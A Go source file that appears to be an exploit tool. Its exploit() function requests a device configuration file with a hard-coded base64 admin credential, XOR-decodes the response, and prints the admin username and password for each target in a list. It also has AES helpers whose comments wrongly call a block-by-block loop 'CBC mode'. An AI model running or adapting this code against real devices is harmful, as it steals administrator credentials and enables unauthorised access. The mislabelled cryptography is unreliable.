package main

import (
	"bytes"
	"crypto/aes"
	"errors"
	"fmt"
	"io/ioutil"
	"regexp"
	"strings"

	"github.com/levigross/grequests"
)

// ZeroPadding pads byte array to block size with zero
func ZeroPadding(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{0}, padding)
	return append(data, padText...)
}

// ZeroUnPadding removes zero padding
func ZeroUnPadding(data []byte) ([]byte, error) {
	padding := 0
	length := len(data)
	if length == 0 {
		return nil, errors.New("cannot remove padding for zero length byte array")
	}
	for i := length - 1; i >= 0; i-- {
		// byte is same to int8, stands for ascii code
		if data[i] == 0 {
			padding++
		} else {
			break
		}
	}
	return data[:length-padding], nil
}

// AesEncrypt function encrypt plaintext by aes CBC mode
func AesEncrypt(plainText []byte, key []byte) []byte {
	block, _ := aes.NewCipher(key)
	blockSize := block.BlockSize()
	plainTextPadding := ZeroPadding(plainText, blockSize)

	cipherByte := make([]byte, len(plainTextPadding))
	for start, end := 0, blockSize; start < len(plainTextPadding); start, end = start+blockSize, end+blockSize {
		block.Encrypt(cipherByte[start:end], plainTextPadding[start:end])
	}

	return cipherByte
}

// AesDecrypt function decrypt plaintext by AES CBC mode
func AesDecrypt(cipherText []byte, key []byte) []byte {
	// create an AES instance
	block, _ := aes.NewCipher(key)
	blockSize := block.BlockSize()
	plainByte := make([]byte, len(cipherText))

	for start, end := 0, blockSize; start < len(cipherText); start, end = start+blockSize, end+blockSize {
		block.Decrypt(plainByte[start:end], cipherText[start:end])
	}

	plainByte, _ = ZeroUnPadding(plainByte)
	return plainByte
}

// xore function returns the xor value of data and cycle key
func xore(data []byte, key []byte) []byte {
	var result []byte
	for i := 0; i < len(data); i++ {
		result = append(result, data[i]^key[i%len(key)])
	}
	return result
}

// FilterStrings function filters all printable strings whose length is more than 2
func FilterStrings(data string) []string {
	printableChars := `A-Za-z0-9/\-:.,_$%'()[\]<> `
	shortestReturnChar := 2
	regExp := fmt.Sprintf("[%s]{%d,}", printableChars, shortestReturnChar)
	pattern := regexp.MustCompile(regExp)

	return pattern.FindAllString(data, -1)
}

// AllIndexOf function returns indexes whose value is same to keyWord
func AllIndexOf(data []string, keyWord string) []int {
	var indexList []int
	for i, v := range data {
		if strings.Compare(v, keyWord) == 0 {
			indexList = append(indexList, i)
		}
	}
	return indexList
}

func exploit(targetList []string) {
	baseURL := "http://%s/System/configurationFile?auth=YWRtaW46MTEK"
	ro := &grequests.RequestOptions{RequestTimeout: 5}
	xorKey := []byte{0x73, 0x8B, 0x55, 0x44}
	for _, target := range targetList {
		res, _ := grequests.Get(fmt.Sprintf(baseURL, target), ro)
		if res.Ok {
			// grequest abstract the Go http.Response object
			content, _ := ioutil.ReadAll(res.RawResponse.Body)
			resultList := FilterStrings(string(xore(content, xorKey)))
			index := AllIndexOf(resultList, "admin")
			if len(resultList) == 0 {
				fmt.Printf("%s,failed", target)
				continue
			}
			username := resultList[index[len(index)-1]]
			password := resultList[index[len(index)-1]+1]
			fmt.Printf("%s,%s,%s", target, username, password)
		}
	}
}

func main() {
	testStr1 := []byte("helloworld!")
	fmt.Printf("%s", testStr1)
}
